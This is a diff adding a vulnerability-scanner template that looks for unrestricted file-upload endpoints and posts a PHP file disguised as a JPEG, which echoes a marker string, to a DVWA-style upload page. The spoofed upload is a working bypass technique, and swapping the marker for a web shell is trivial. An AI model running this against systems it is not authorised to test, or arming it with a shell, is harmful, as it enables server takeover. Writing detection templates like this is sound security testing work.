@@ -1,0 +1,53 @@
+id: hunt3r-file-upload-bypass
+
+info:
+  name: Unrestricted File Upload Detection
+  author: hunt3r
+  severity: critical
+  description: Detects unrestricted file upload endpoints that may allow web shell uploads.
+  tags: file-upload,rce,hunt3r
+  reference:
+    - https://portswigger.net/web-security/file-upload
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/upload/"
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/upload.php"
+      - "{{BaseURL}}/file-upload"
+      - "{{BaseURL}}/api/file-upload"
+      - "{{BaseURL}}/fileupload"
+      - "{{BaseURL}}/uploads/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "upload"
+          - "file"
+          - "Browse"
+          - "Choose"
+          - "multipart"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/vulnerabilities/upload/"
+
+    body: "--boundary\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"hunt3r_test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo 'HUNT3R_RCE'; ?>\r\n--boundary\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n--boundary--"
+    headers:
+      Content-Type: "multipart/form-data; boundary=boundary"
+      Cookie: "security=low"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "succesfully uploaded"
+          - "HUNT3R_RCE"
+          - "has been uploaded"
